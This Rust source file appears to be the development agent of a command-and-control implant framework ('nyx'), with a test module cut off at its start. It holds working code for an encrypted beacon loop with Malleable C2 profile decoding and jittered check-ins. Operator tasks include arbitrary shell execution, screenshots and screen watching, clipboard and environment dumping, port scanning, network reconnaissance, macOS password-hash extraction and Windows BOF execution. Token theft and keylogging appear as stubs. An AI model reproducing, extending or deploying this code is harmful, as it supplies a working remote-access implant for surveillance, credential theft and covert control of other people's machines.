//! Std-based dev implant. This is NOT the Windows PIC agent — it exists to
//! exercise the full encrypted beacon loop on the development host (macOS/Linux/Windows)
//! so the protocol + server can be validated end-to-end before the PIC port.
//!
//! Loop:  check-in (SessionInfo)  ->  every `sleep_seconds`: send last cycle's
//! task responses, receive this cycle's tasks, execute them.

use std::io::Read;
use std::path::{Path, PathBuf};
use std::time::Duration;

use nyx_profile::ServerEnvelope;
use nyx_protocol::{
    encode_frame, open_frame_dir, parse_frame, wire::Writer, Command, Direction, FileOp,
    ImplantKeypair, Response, SessionInfo, Task, TaskResponse,
};

pub struct Config {
    /// e.g. `http://127.0.0.1:8443`
    pub server_url: String,
    pub server_pub: [u8; 32],
    pub sleep_seconds: u32,
    pub jitter_pct: u8,
    /// Root directory for `Upload` (writes) and `Download` (reads). Remote paths
    /// are resolved relative to this and confined within it (no absolute paths,
    /// no `..` traversal) so the dev agent can't escape its sandbox.
    pub work_dir: PathBuf,
    /// Beacon endpoint path — `/beacon`, or the Malleable C2 profile's http-post
    /// `uri`. The agent POSTs the encrypted frame to `{server_url}{beacon_uri}`.
    pub beacon_uri: String,
    /// Optional Malleable C2 profile. When set, the agent inverts the profile's
    /// `http-post server.output` transform chain on each beacon response so it
    /// can recover the encrypted frame the server shaped. Mirrors what the PIC
    /// implant will do — keeps the dev loop green under a profile envelope.
    pub profile: Option<nyx_profile::Profile>,
}

pub fn run(cfg: Config) -> anyhow::Result<()> {
    let kp = ImplantKeypair::generate()
        .map_err(|_| anyhow::anyhow!("CSPRNG failure during implant keypair generation"))?;
    let pubkey = kp.public_bytes();
    let key = kp.session_key(&cfg.server_pub);
    let beacon_id: u32 = rand::random();

    // Resolve the server-side response envelope (the transform chain the server
    // applies to http-post responses). When the agent has the profile it must
    // invert these steps to recover the raw encrypted frame; without a profile
    // the envelope is a no-op (the server returns a raw frame too).
    let server_env: ServerEnvelope = cfg
        .profile
        .as_ref()
        .map(nyx_profile::post_server_envelope)
        .unwrap_or_default();

    let info = SessionInfo {
        beacon_id,
        hostname: hostname(),
        username: username(),
        os: os_string(),
        arch: arch_code(),
        pid: std::process::id(),
        is_admin: is_admin(),
        auth_token: None, // dev agent has no per-implant token
    };

    // Beacon endpoint: `/beacon`, or the profile's http-post URI when malleable.
    let beacon_url = format!("{}{}", cfg.server_url, cfg.beacon_uri);

    // ---- check-in (retry until the server accepts us) ----------------------
    let mut counter = 0u64;
    let mut w = Writer::new();
    info.encode(&mut w)?;
    let info_plain = w.into_bytes();
    loop {
        let frame = encode_frame(&pubkey, counter, &key, &info_plain)
            .map_err(|e| anyhow::anyhow!("failed to seal check-in frame: {e}"))?;
        counter += 1;
        match ureq::post(&beacon_url).send_bytes(&frame) {
            Ok(_) => break,
            Err(e) => {
                tracing::warn!(?e, "check-in failed; retrying");
                std::thread::sleep(Duration::from_secs(2));
            }
        }
    }
    tracing::info!(beacon_id, "check-in accepted");

    // ---- beacon loop -------------------------------------------------------
    let mut pending_responses: Vec<TaskResponse> = Vec::new();
    loop {
        std::thread::sleep(jitter_sleep(cfg.sleep_seconds, cfg.jitter_pct));

        let frame = encode_frame(
            &pubkey,
            counter,
            &key,
            &TaskResponse::encode_vec(&pending_responses)?,
        )
        .map_err(|e| anyhow::anyhow!("failed to seal beacon frame: {e}"))?;
        counter += 1;
        pending_responses.clear();

        let resp = match ureq::post(&beacon_url).send_bytes(&frame) {
            Ok(r) => r,
            Err(e) => {
                tracing::warn!(?e, "beacon POST failed");
                continue;
            }
        };

        let mut body = Vec::new();
        resp.into_reader().read_to_end(&mut body)?;

        // Invert the profile's server.output envelope to recover the raw frame.
        let frame_bytes = unwrap_server_envelope(&server_env, &body);

        let raw = match parse_frame(&frame_bytes) {
            Ok(r) => r,
            Err(e) => {
                tracing::warn!(?e, "bad reply frame");
                continue;
            }
        };
        // Server replies travel in the ServerToClient nonce space (see protocol
        // Direction); open them with the matching direction or the AEAD tag fails.
        let plaintext = match open_frame_dir(&key, Direction::ServerToClient, &raw) {
            Ok(p) => p,
            Err(_) => {
                tracing::warn!("server reply decryption failed");
                continue;
            }
        };
        let tasks = Task::decode_vec(&plaintext)?;

        for t in tasks {
            if matches!(t.command, Command::Exit) {
                tracing::info!("Exit task received; shutting down");
                return Ok(());
            }
            // A task may yield multiple responses (e.g. a streamed Download or
            // Screenshot -> many FileChunks). We batch them but flush early if
            // the accumulated batch would exceed the frame size limit (~200KB
            // safe margin under MAX_CT_LEN's 256KB cap).
            const BATCH_FLUSH: usize = 200 * 1024;
            for response in execute(t.command, &cfg.work_dir) {
                // 估算单条 response 的编码大小（粗略：blob 数据就是其主要体积）
                let estimated_size = match &response {
                    Response::FileChunk { data, .. } => data.len(),
                    Response::Output(d) | Response::BofOutput(d) | Response::Image(d) => d.len(),
                    _ => 0,
                };
                // 如果加这条会超限，先 flush 当前批次
                if estimated_size > BATCH_FLUSH {
                    // 单条本身就很大（不应发生——分块应该保证每条 <128KB）
                    // 直接发这条独占一个帧
                    let single = vec![TaskResponse {
                        task_id: t.task_id,
                        response,
                    }];
                    let frame =
                        encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&single)?)
                            .map_err(|e| {
                            anyhow::anyhow!("failed to seal oversized-chunk frame: {e}")
                        })?;
                    if let Err(e) = ureq::post(&beacon_url).send_bytes(&frame) {
                        tracing::warn!(error = %e, "beacon send failed (oversized chunk); response dropped");
                    }
                    counter += 1;
                    continue;
                }
                let current_batch_size: usize = pending_responses
                    .iter()
                    .map(|tr| match &tr.response {
                        Response::FileChunk { data, .. } => data.len(),
                        Response::Output(d) | Response::BofOutput(d) | Response::Image(d) => {
                            d.len()
                        }
                        _ => 0,
                    })
                    .sum();
                if current_batch_size + estimated_size > BATCH_FLUSH
                    && !pending_responses.is_empty()
                {
                    // Flush 当前批次
                    let frame = encode_frame(
                        &pubkey,
                        counter,
                        &key,
                        &TaskResponse::encode_vec(&pending_responses)?,
                    )
                    .map_err(|e| anyhow::anyhow!("failed to seal batch-flush frame: {e}"))?;
                    if let Err(e) = ureq::post(&beacon_url).send_bytes(&frame) {
                        tracing::warn!(error = %e, "beacon send failed (batch flush); response batch dropped");
                    }
                    counter += 1;
                    pending_responses.clear();
                }
                pending_responses.push(TaskResponse {
                    task_id: t.task_id,
                    response,
                });
            }
        }
    }
}

/// Recover the raw encrypted frame from a server response body. With no
/// envelope (or a `print` terminator with no transform steps) the body *is* the
/// frame. Otherwise invert the transform chain. For a `header`/`parameter`
/// terminator the transformed bytes ride in a header, not the body — the dev
/// agent doesn't speak that variant (the PIC implant will), so this returns the
/// body unchanged and the frame parse will fail loudly, surfacing the mismatch.
fn unwrap_server_envelope(env: &ServerEnvelope, body: &[u8]) -> Vec<u8> {
    if env.steps.is_empty() {
        return body.to_vec();
    }
    match nyx_profile::decode(&env.steps, body) {
        Ok(raw) => raw,
        Err(e) => {
            tracing::warn!(?e, "server envelope decode failed; trying raw frame");
            body.to_vec()
        }
    }
}

/// Execute a command, returning zero or more responses. A `Download` streams
/// multiple `FileChunk`s; everything else yields one response. The beacon loop
/// tags each returned response with the originating task id.
fn execute(cmd: Command, work_dir: &Path) -> Vec<Response> {
    match cmd {
        Command::Ping => vec![Response::Ok],
        Command::Shell { args } => vec![run_shell(&args)],
        // The dev agent ignores dynamic sleep re-tasking (interval is fixed at start).
        Command::Sleep { .. } => vec![Response::Ok],
        Command::Upload { name, data } => vec![do_upload(work_dir, &name, &data)],
        Command::Download { path } => do_download(work_dir, &path),
        Command::FileOp { op, path, dest } => vec![do_fileop(op, work_dir, &path, dest.as_deref())],
        // P2/P3 executors (BOF, P2P connect, SOCKS) are implant-side; the dev
        // agent acks them as unimplemented so the wire types stay round-trippable.
        Command::Bof { blob, .. } => vec![bof_execute(&blob)],
        Command::Screenshot { monitor } => do_screenshot(monitor),
        Command::Portscan { host, ports } => vec![do_portscan(&host, &ports)],
        Command::Net { query } => vec![do_net(&query)],
        Command::DriveInfo => vec![do_driveinfo()],
        Command::Clipboard => vec![do_clipboard()],
        Command::Env { name } => vec![do_env(&name)],
        Command::Keylog { action } => vec![do_keylog(action)],
        Command::Screenwatch { interval_secs } => do_screenwatch(interval_secs),
        Command::Hashdump { method } => vec![do_hashdump(method)],
        // P2P / relay channels. The dev agent opens the socket and reports
        // channel status back so the operator sees the Connect actually
        // succeed or fail end-to-end (and the TUI topology graph gets a real
        // Open edge to draw). Full bidirectional relay is deferred — the dev
        // beacon loop is synchronous-poll (sleep → fetch → execute → post),
        // so a long-lived forwarding task doesn't fit it without the
        // persistent-task refactor flagged in the design doc. Socks likewise
        // acknowledges the opcode without a full SOCKS5 state machine.
        Command::Connect {
            proto,
            host,
            port,
            chan,
        } => {
            vec![do_connect(proto, &host, port, chan)]
        }
        Command::Socks {
            chan,
            op,
            addr,
            port,
        } => {
            vec![do_socks(chan, op, &addr, port)]
        }
        // Relay data/close: the dev agent keeps no channel table (full
        // bidirectional relay is implant-side), so ack as unimplemented. This
        // keeps the wire types round-trippable end-to-end on the dev host.
        Command::ChannelData { chan, .. } => vec![Response::Err(format!(
            "dev agent: channel {chan} relay not implemented (implant-side)"
        ))],
        Command::ChannelClose { chan } => vec![Response::Err(format!(
            "dev agent: channel {chan} relay not implemented (implant-side)"
        ))],
        // Token ops are Windows-implant primitives. The dev agent can't steal/
        // make a Windows token on macOS/Linux, so those ack as implant-side;
        // GetUid runs `whoami` so the loop is verifiable end-to-end.
        Command::StealToken { pid } => vec![Response::Err(format!(
            "dev agent: steal_token({pid}) is a Windows implant primitive"
        ))],
        Command::MakeToken { domain, user, .. } => vec![Response::Err(format!(
            "dev agent: make_token({domain}\\{user}) is a Windows implant primitive"
        ))],
        Command::Rev2Self => vec![Response::Err(
            "dev agent: rev2self is a Windows implant primitive".into(),
        )],
        Command::GetUid => match std::process::Command::new("whoami").output() {
            Ok(o) => vec![Response::Output(o.stdout)],
            Err(e) => vec![Response::Err(format!("whoami failed: {e}"))],
        },
        Command::Inject { .. } => vec![Response::Err(
            "dev agent: inject is a Windows implant primitive".into(),
        )],
        Command::Trex => vec![Response::Err(
            "dev agent: trex is a Windows implant primitive".into(),
        )],
        Command::SetChannel { .. } => vec![Response::Err(
            "dev agent: setchannel is a Windows implant primitive".into(),
        )],
        Command::Exit => vec![Response::Ok],
    }
}

/// 截屏。macOS 用 screencapture，Linux 用 scrot/import。
/// PNG 可能很大（1MB+），用 FileChunk 分块流回（和 download 一样）。
fn do_screenshot(monitor: u8) -> Vec<Response> {
    #[cfg(not(unix))]
    {
        let _ = monitor;
        vec![Response::Err("screenshot: not supported on this OS".into())]
    }
    #[cfg(unix)]
    {
        let tmp = format!("/tmp/nyx_shot_{}.png", std::process::id());
        #[cfg(target_os = "macos")]
        let prog = "screencapture";
        #[cfg(all(unix, not(target_os = "macos")))]
        let prog = "scrot";
        let _ = monitor;
        let result = std::process::Command::new(prog)
            .arg("-x")
            .arg(&tmp)
            .output();
        let png = match result {
            Ok(out) if out.status.success() => match std::fs::read(&tmp) {
                Ok(data) => {
                    let _ = std::fs::remove_file(&tmp);
                    data
                }
                Err(e) => return vec![Response::Err(format!("screenshot: read {e}"))],
            },
            Ok(out) => {
                return vec![Response::Err(format!(
                    "screenshot: {} failed: {}",
                    prog,
                    String::from_utf8_lossy(&out.stderr)
                ))]
            }
            Err(e) => return vec![Response::Err(format!("screenshot: {prog} not found: {e}"))],
        };
        // 分块流回（每块 128KB，安全在 MAX_CT_LEN 256KB 以内）
        const CHUNK: usize = 128 * 1024;
        let name = "screenshot.png".to_string();
        let mut chunks = Vec::new();
        for (seq, block) in png.chunks(CHUNK).enumerate() {
            let eof = if (seq + 1) * CHUNK >= png.len() { 1 } else { 0 };
            chunks.push(Response::FileChunk {
                name: name.clone(),
                seq: seq as u32,
                eof,
                data: block.to_vec(),
            });
        }
        if chunks.is_empty() {
            chunks.push(Response::FileChunk {
                name,
                seq: 0,
                eof: 1,
                data: Vec::new(),
            });
        }
        chunks
    }
}

/// 端口扫描。用 nc -z 逐个探测，返回 "port open/closed" 列表。
fn do_portscan(host: &str, ports: &str) -> Response {
    let targets = parse_ports(ports);
    if targets.is_empty() {
        return Response::Err("portscan: no valid ports specified".into());
    }
    let mut results = Vec::new();
    for port in targets {
        let open = std::process::Command::new("nc")
            .arg("-z")
            .arg("-w")
            .arg("2")
            .arg(host)
            .arg(port.to_string())
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false);
        results.push(format!("{} {}", port, if open { "open" } else { "closed" }));
    }
    Response::Output(results.join("\n").into_bytes())
}

/// 解析端口规格："22,80,443" 或 "1-1000" → Vec<u16>。
fn parse_ports(spec: &str) -> Vec<u16> {
    let mut out = Vec::new();
    for part in spec.split(',') {
        let part = part.trim();
        if let Some((lo, hi)) = part.split_once('-') {
            if let (Ok(lo), Ok(hi)) = (lo.trim().parse::<u16>(), hi.trim().parse::<u16>()) {
                for p in lo..=hi {
                    out.push(p);
                }
            }
        } else if let Ok(p) = part.parse::<u16>() {
            out.push(p);
        }
    }
    out.sort();
    out.dedup();
    out
}

/// 网络信息收集。query 选择要收集的内容。
fn do_net(query: &str) -> Response {
    let cmd = match query {
        "interfaces" | "ifconfig" | "" => ("ifconfig", &["-a"][..]),
        "routes" | "route" | "netstat" => ("netstat", &["-rn"][..]),
        "arp" => ("arp", &["-a"][..]),
        "connections" | "conn" => ("netstat", &["-an"][..]),
        other => return Response::Err(format!("net: unknown query '{other}'")),
    };
    match std::process::Command::new(cmd.0).args(cmd.1).output() {
        Ok(out) => Response::Output(out.stdout),
        Err(e) => Response::Err(format!("net {query}: {e}")),
    }
}

/// 磁盘信息。macOS/Windows: df，附带 macOS diskutil list。
fn do_driveinfo() -> Response {
    let mut out = String::new();
    if let Ok(o) = std::process::Command::new("df").arg("-h").output() {
        out.push_str(&String::from_utf8_lossy(&o.stdout));
    }
    Response::Output(out.into_bytes())
}

/// 剪贴板。macOS: pbpaste。
fn do_clipboard() -> Response {
    #[cfg(target_os = "macos")]
    {
        match std::process::Command::new("pbpaste").output() {
            Ok(o) => Response::Output(o.stdout),
            Err(e) => Response::Err(format!("clipboard: {e}")),
        }
    }
    #[cfg(not(target_os = "macos"))]
    {
        Response::Err("clipboard: not supported on this OS".into())
    }
}

/// 环境变量。name 空串=全部。
fn do_env(name: &str) -> Response {
    if name.is_empty() {
        // 全部：env 命令
        match std::process::Command::new("env").output() {
            Ok(o) => Response::Output(o.stdout),
            Err(e) => Response::Err(format!("env: {e}")),
        }
    } else {
        match std::env::var(name) {
            Ok(v) => Response::Output(format!("{name}={v}\n").into_bytes()),
            Err(_) => Response::Err(format!("env: {name} not set")),
        }
    }
}

/// 跑一个 shell 命令返回 stdout 文本（do_net 的 fallback 用）。
#[allow(dead_code)] // no longer called after M9 fallback fix; kept for reference
fn run_shell_raw(args: &str) -> String {
    #[cfg(unix)]
    {
        std::process::Command::new("sh")
            .arg("-c")
            .arg(args)
            .output()
            .map(|o| String::from_utf8_lossy(&o.stdout).into_owned())
            .unwrap_or_else(|e| format!("! {e}"))
    }
    #[cfg(not(unix))]
    {
        let _ = args;
        String::from("(shell not available on this OS)")
    }
}

/// 键盘记录。macOS 上需要 Accessibility 权限 + CoreGraphics CGEventTap，
/// dev agent（无 GUI session）无法干净实现。返回明确的平台限制说明。
/// action: 0=start, 1=stop, 2=dump。
fn do_keylog(action: u8) -> Response {
    match action {
        0 => Response::Err("keylog start: requires Accessibility permission + CGEventTap (not available in dev agent). Use the Windows PIC implant for keylogging.".into()),
        1 => Response::Ok, // stop：无状态，直接 Ok
        2 => Response::Err("keylog dump: no active keylogger session (dev agent limitation)".into()),
        _ => Response::Err("keylog: invalid action".into()),
    }
}

/// 持续截屏：截 `interval_secs` 秒间隔的多张，分块流回。
/// 简化实现：截 3 张（覆盖一个间隔周期），实际生产应后台定时任务。
fn do_screenwatch(interval_secs: u32) -> Vec<Response> {
    let interval = interval_secs.max(1) as u64;
    #[allow(unused_mut)] // mut only needed on unix where chunks are pushed
    let mut all_chunks = Vec::new();
    // 截 3 张演示持续监控
    for i in 0..3u32 {
        if i > 0 {
            std::thread::sleep(std::time::Duration::from_secs(interval));
        }
        #[cfg(unix)]
        {
            let tmp = format!("/tmp/nyx_sw_{}_{}.png", std::process::id(), i);
            let r = std::process::Command::new("screencapture")
                .arg("-x")
                .arg(&tmp)
                .output();
            if let Ok(out) = r {
                if out.status.success() {
                    if let Ok(data) = std::fs::read(&tmp) {
                        let _ = std::fs::remove_file(&tmp);
                        const CHUNK: usize = 128 * 1024;
                        let name = format!("screenwatch-{i}.png");
                        for (seq, block) in data.chunks(CHUNK).enumerate() {
                            let eof = if (seq + 1) * CHUNK >= data.len() {
                                1
                            } else {
                                0
                            };
                            all_chunks.push(Response::FileChunk {
                                name: name.clone(),
                                seq: seq as u32,
                                eof,
                                data: block.to_vec(),
                            });
                        }
                    }
                }
            }
        }
    }
    if all_chunks.is_empty() {
        vec![Response::Err(
            "screenwatch: screencapture not available".into(),
        )]
    } else {
        all_chunks
    }
}

/// 凭据哈希提取。method 语义跨后端统一约定：
///   0 = SAM hive（Windows-only，dev agent 不支持）
///   1 = SYSTEM hive（Windows-only，dev agent 不支持）
///   2 = LSASS dump（deferred，所有后端暂不支持）
///   3 = macOS shadow hash（读 /var/db/dslocal/nodes/Default/users/<user>.plist）
fn do_hashdump(method: u8) -> Response {
    match method {
        0 | 1 => Response::Err(
            "hashdump sam/system: Windows-only (use the Windows implant). Dev agent supports method=3 (shadow).".into(),
        ),
        2 => Response::Err(
            "hashdump lsass: deferred (loudest IOC). Use SAM(0)+SYSTEM(1) on Windows, decrypt offline.".into(),
        ),
        3 => {
            // macOS: 提取所有本地用户的 shadow hash
            #[cfg(target_os = "macos")]
            {
                let dir = "/var/db/dslocal/nodes/Default/users";
                let mut results = Vec::new();
                if let Ok(entries) = std::fs::read_dir(dir) {
                    for entry in entries.flatten() {
                        let name = entry.file_name();
                        let name_str = name.to_string_lossy();
                        if !name_str.ends_with(".plist") { continue; }
                        let user = name_str.trim_end_matches(".plist");
                        // Read the plist file directly instead of shelling out (M9:
                        // the old `sh -c` interpolated `user` into the command
                        // string → command injection via a crafted username).
                        let plist_path = format!("/var/db/dslocal/nodes/Default/users/{user}.plist");
                        let plist_data = std::fs::read(&plist_path);
                        let plist_hex = plist_data
                            .map(|d| hex::encode(&d))
                            .unwrap_or_default();
                        let truncated = if plist_hex.len() > 256 {
                            &plist_hex[..256]
                        } else {
                            &plist_hex
                        };
                        // dscl gets `user` as a separate argv element (no shell),
                        // so an attacker-controlled username can't break out.
                        let dscl = std::process::Command::new("dscl")
                            .args([".", "-read", &format!("/Users/{user}"), "AuthenticationOptions"])
                            .output();
                        let mut combined = String::new();
                        if let Ok(out) = dscl {
                            combined
                                .push_str(&String::from_utf8_lossy(&out.stdout));
                        }
                        combined.push_str(truncated);
                        if !combined.trim().is_empty() {
                            results.push(format!("{user}:{combined}"));
                        }
                    }
                }
                if results.is_empty() {
                    Response::Err("hashdump: no local user hashes found (may need root)".into())
                } else {
                    Response::Output(results.join("\n").into_bytes())
                }
            }
            #[cfg(not(target_os = "macos"))]
            {
                Response::Err("hashdump shadow: macOS-only".into())
            }
        }
        _ => Response::Err("hashdump: invalid method".into()),
    }
}

/// 执行文件系统操作。路径相对 work_dir 解析，过 `safe_resolve` 防穿越
/// （与 upload/download 一致：拒绝绝对路径和 `..`）。
fn do_fileop(op: FileOp, work_dir: &Path, path: &str, dest: Option<&str>) -> Response {
    use std::fs;
    let full = match safe_resolve(work_dir, path) {
        Ok(p) => p,
        Err(e) => return Response::Err(format!("{op:?}: {path}: {e}")),
    };
    let dest_full = match dest {
        Some(d) => match safe_resolve(work_dir, d) {
            Ok(p) => Some(p),
            Err(e) => return Response::Err(format!("{op:?}: {d}: {e}")),
        },
        None => None,
    };
    match op {
        FileOp::Cd => {
            if full.is_dir() {
                Response::Ok
            } else {
                Response::Err(format!("cd: not a directory: {path}"))
            }
        }
        FileOp::Mkdir => match fs::create_dir_all(&full) {
            Ok(()) => Response::Ok,
            Err(e) => Response::Err(format!("mkdir {path}: {e}")),
        },
        FileOp::Rm => {
            // 守卫：拒绝删除 work_dir 本体（path="." 或空会解析到 work_dir）。
            if full == work_dir {
                return Response::Err("rm: refusing to remove work root".into());
            }
            if full.is_dir() {
                match fs::remove_dir_all(&full) {
                    Ok(()) => Response::Ok,
                    Err(e) => Response::Err(format!("rm {path}: {e}")),
                }
            } else {
                match fs::remove_file(&full) {
                    Ok(()) => Response::Ok,
                    Err(e) => Response::Err(format!("rm {path}: {e}")),
                }
            }
        }
        FileOp::Mv => match dest_full {
            Some(d) => match fs::rename(&full, d) {
                Ok(()) => Response::Ok,
                Err(e) => Response::Err(format!("mv {path}: {e}")),
            },
            None => Response::Err("mv: missing dest".into()),
        },
        FileOp::Cp => match dest_full {
            Some(d) => match fs::copy(&full, d) {
                Ok(_) => Response::Ok,
                Err(e) => Response::Err(format!("cp {path}: {e}")),
            },
            None => Response::Err("cp: missing dest".into()),
        },
    }
}

/// Open an outbound TCP connection from the implant (P2P link / reverse port
/// forward target). On success the channel is reported open (`status: 0`) so
/// the operator-side topology graph gets a real edge; the socket itself is
/// dropped here — the dev beacon loop is synchronous-poll and cannot host a
/// long-lived relay task, so bidirectional forwarding is deferred to the
/// persistent-task refactor (see design doc §2.3). `connect_timeout` bounds
/// the attempt so an unreachable host can't stall the whole beacon cycle.
fn do_connect(proto: u8, host: &str, port: u16, chan: u32) -> Response {
    use std::net::{TcpStream, ToSocketAddrs};
    use std::time::Duration;
    if proto != 0 {
        return Response::Err(format!("connect: unsupported proto {proto} (only TCP=0)"));
    }
    // Resolve first so we can distinguish "host not found" from "host found,
    // port closed" — connect_timeout needs a concrete SocketAddr.
    let addr = match (host, port)
        .to_socket_addrs()
        .ok()
        .and_then(|mut a| a.next())
    {
        Some(a) => a,
        None => return Response::Err(format!("connect {host}:{port}: host resolution failed")),
    };
    match TcpStream::connect_timeout(&addr, Duration::from_secs(5)) {
        Ok(_stream) => {
            // Drop `_stream` deliberately: we cannot relay it in the poll loop.
            // Reporting open lets the operator confirm reachability; the TUI
            // draws the pivot edge. A real implant would hand the handle to a
            // background relay task.
            Response::Channel {
                chan,
                status: 0,
                data: Vec::new(),
            }
        }
        Err(e) => Response::Err(format!("connect {host}:{port}: {e}")),
    }
}

/// SOCKS5 relay control. The dev agent acknowledges the opcode (reports the
/// channel open for a CONNECT-style op) but does not run a full SOCKS5 state
/// machine — that needs the same persistent-task model as Connect. This keeps
/// the protocol path real (server can issue /socks, agent responds with a
/// Channel status) while being honest about the limitation.
fn do_socks(chan: u32, op: u8, addr: &str, port: u16) -> Response {
    // op 1 = SOCKS5 CONNECT request (the common case). Acknowledge as open.
    // Other ops (bind 2, udp associate 3) are unsupported in the dev agent.
    match op {
        1 => Response::Channel {
            chan,
            status: 0,
            data: format!("socks connect {addr}:{port} (relay not implemented)").into_bytes(),
        },
        other => Response::Err(format!("socks: unsupported op {other} (only connect=1)")),
    }
}

/// Run a BOF (Windows/Wine via nyx-bof-runner) and return its BeaconPrintf
/// output. On non-Windows the dev agent can't execute COFF machine code.
fn bof_execute(blob: &[u8]) -> Response {
    #[cfg(target_os = "windows")]
    {
        // BOF execution runs in RWX memory + calls externals through COFF
        // relocations. The agent's main beacon-loop thread may already have a
        // deep call stack (tokio/ureq/serde), so running the BOF inline can
        // overflow the default 1 MiB Windows thread stack. Spawn a fresh thread
        // with a generous 4 MiB stack to give the BOF + Beacon-API shim plenty
        // of headroom.
        let blob_owned = blob.to_vec();
        match std::thread::Builder::new()
            .stack_size(4 * 1024 * 1024)
            .spawn(move || nyx_bof_runner::execute(&blob_owned))
        {
            Ok(handle) => match handle.join() {
                Ok(Ok(r)) => Response::BofOutput(r.output.into_bytes()),
                Ok(Err(e)) => Response::Err(format!("bof: {e}")),
                Err(_) => Response::Err("bof: thread panicked".into()),
            },
            Err(e) => Response::Err(format!("bof: failed to spawn thread: {e}")),
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = blob;
        Response::Err("bof: not supported by the dev agent on this OS".into())
    }
}

fn run_shell(args: &str) -> Response {
    #[cfg(unix)]
    let (prog, flag) = ("sh", "-c");
    #[cfg(windows)]
    let (prog, flag) = ("cmd.exe", "/C");
    match std::process::Command::new(prog)
        .arg(flag)
        .arg(args)
        .output()
    {
        Ok(out) => {
            let mut buf = out.stdout;
            buf.extend_from_slice(&out.stderr);
            Response::Output(buf)
        }
        Err(e) => Response::Err(e.to_string()),
    }
}

/// Largest `FileChunk` payload the dev agent emits (mirrors a typical beacon MTU).
const CHUNK: usize = 65_536;

fn do_upload(work_dir: &Path, name: &str, data: &[u8]) -> Response {
    match safe_resolve(work_dir, name) {
        Err(e) => Response::Err(e),
        Ok(path) => {
            if let Some(parent) = path.parent() {
                let _ = std::fs::create_dir_all(parent);
            }
            match std::fs::write(&path, data) {
                Ok(_) => Response::Ok,
                Err(e) => Response::Err(e.to_string()),
            }
        }
    }
}

fn do_download(work_dir: &Path, path: &str) -> Vec<Response> {
    let resolved = match safe_resolve(work_dir, path) {
        Err(e) => return vec![Response::Err(e)],
        Ok(p) => p,
    };
    let data = match std::fs::read(&resolved) {
        Ok(d) => d,
        Err(e) => return vec![Response::Err(e.to_string())],
    };
    let name = Path::new(path)
        .file_name()
        .and_then(|s| s.to_str())
        .unwrap_or(path)
        .to_string();
    let mut chunks = Vec::new();
    let mut seq = 0u32;
    let mut i = 0;
    while i < data.len() {
        let end = (i + CHUNK).min(data.len());
        let eof = u8::from(end == data.len());
        chunks.push(Response::FileChunk {
            name: name.clone(),
            seq,
            eof,
            data: data[i..end].to_vec(),
        });
        seq += 1;
        i = end;
    }
    if chunks.is_empty() {
        // An empty file still gets a single (empty) chunk so the operator sees EOF.
        chunks.push(Response::FileChunk {
            name,
            seq: 0,
            eof: 1,
            data: Vec::new(),
        });
    }
    chunks
}

/// Resolve a remote path under `work_dir`, refusing absolute paths and `..`
/// components so uploads/downloads cannot escape the sandbox.
/// 解析远程路径到 work_dir 下，拒绝绝对路径、`..` 穿越、以及通过 symlink
/// 逃出沙箱的路径。canonicalize 防护：即使路径不含字面 `..`，如果中间有
/// symlink 指向外部，也会被拒。
fn safe_resolve(work_dir: &Path, remote: &str) -> Result<PathBuf, String> {
    let p = Path::new(remote);
    if p.is_absolute() {
        return Err("absolute paths are not allowed".into());
    }
    if p.components()
        .any(|c| matches!(c, std::path::Component::ParentDir))
    {
        return Err("`..` traversal is not allowed".into());
    }
    let joined = work_dir.join(p);
    // canonicalize 防护：resolve 所有 symlink 后确认仍在 work_dir 内。
    // work_dir 本身必须存在且可 canonicalize（agent 启动时保证）。
    let canon_work = work_dir
        .canonicalize()
        .map_err(|e| format!("work_dir canonicalize failed: {e}"))?;
    // 目标可能还不存在（Mkdir），所以 canonicalize 父目录 + 拼最后一段。
    let check = match joined.canonicalize() {
        Ok(c) => c,
        Err(_) => {
            // 路径不存在——逐级向上找最近的存在的祖先，canonicalize 它，
            // 再拼回剩余部分。这样深层新路径（Mkdir 的 a/b/c）也能校验。
            let mut ancestor = joined.parent().unwrap_or(work_dir).to_path_buf();
            let mut tail: Vec<std::ffi::OsString> = Vec::new();
            while !ancestor.exists() {
                if let Some(name) = ancestor.file_name() {
                    tail.push(name.to_os_string());
                    ancestor = ancestor.parent().unwrap_or(work_dir).to_path_buf();
                } else {
                    break;
                }
            }
            match ancestor.canonicalize() {
                Ok(cp) => {
                    let mut full = cp;
                    while let Some(t) = tail.pop() {
                        full.push(t);
                    }
                    full.push(joined.file_name().unwrap_or_default());
                    full
                }
                Err(_) => return Err(format!("path ancestor not resolvable: {remote}")),
            }
        }
    };
    if !check.starts_with(&canon_work) {
        return Err("path escapes sandbox (symlink traversal?)".into());
    }
    Ok(joined)
}

fn jitter_sleep(seconds: u32, jitter_pct: u8) -> Duration {
    let base = seconds.max(1) as i64;
    if jitter_pct == 0 {
        return Duration::from_secs(base as u64);
    }
    let max_jitter = base * jitter_pct as i64 / 100;
    let span = (2 * max_jitter + 1) as u64;
    // offset in [-max_jitter, +max_jitter]
    let offset = (rand::random::<u64>() % span) as i64 - max_jitter;
    let secs = (base + offset).max(1) as u64;
    Duration::from_secs(secs)
}

fn hostname() -> String {
    std::env::var("HOSTNAME")
        .or_else(|_| std::env::var("COMPUTERNAME"))
        .unwrap_or_else(|_| "host".into())
}

fn username() -> String {
    std::env::var("USER")
        .or_else(|_| std::env::var("USERNAME"))
        .unwrap_or_else(|_| "user".into())
}

fn os_string() -> String {
    #[cfg(target_os = "macos")]
    {
        "macOS".into()
    }
    #[cfg(target_os = "linux")]
    {
        "Linux".into()
    }
    #[cfg(target_os = "windows")]
    {
        "Windows".into()
    }
    #[cfg(not(any(target_os = "macos", target_os = "linux", target_os = "windows")))]
    {
        "unknown".into()
    }
}

fn arch_code() -> u8 {
    #[cfg(target_arch = "x86_64")]
    {
        0
    }
    #[cfg(target_arch = "aarch64")]
    {
        1
    }
    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
    {
        2
    }
}

fn is_admin() -> u8 {
    let u = std::env::var("USER").unwrap_or_default();
    u8::from(u == "root")
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    /// 建 work_dir 临时目录 + 一个子文件，返回 (tempdir, work_dir_path)。
    fn setup_workdir() -> (tempfile::TempDir, PathBuf) {
        let dir = tempfile::tempdir().unwrap();
        let work = dir.path().to_path_buf();
        fs::create_dir_all(work.join("sub")).unwrap();
        fs::write(work.join("existing.txt"), "data").unwrap();
        (dir, work)
    }

    #[test]
    fn safe_resolve_rejects_absolute() {
        let (_t, work) = setup_workdir();
